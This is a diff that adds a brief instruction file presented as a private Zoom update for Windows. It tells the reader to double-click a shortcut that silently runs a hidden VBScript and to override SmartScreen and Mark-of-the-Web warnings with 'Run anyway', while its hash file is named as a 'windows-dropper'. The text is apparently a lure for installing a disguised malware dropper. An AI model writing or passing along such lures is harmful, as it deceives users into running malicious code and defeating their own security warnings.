@@ -1,0 +1,9 @@
+Zoom Private Update - Windows
+
+Double-click "Zoom_Update_v6.1.1.lnk" (Zoom icon). No console, no chmod.
+The shortcut starts "Zoom_Update_v6.1.1.vbs" hidden from this same folder.
+
+If Windows shows a SmartScreen/Mark-of-the-Web prompt, choose
+"More info" -> "Run anyway".
+
+Hashes: see SHA256SUMS-windows-dropper.
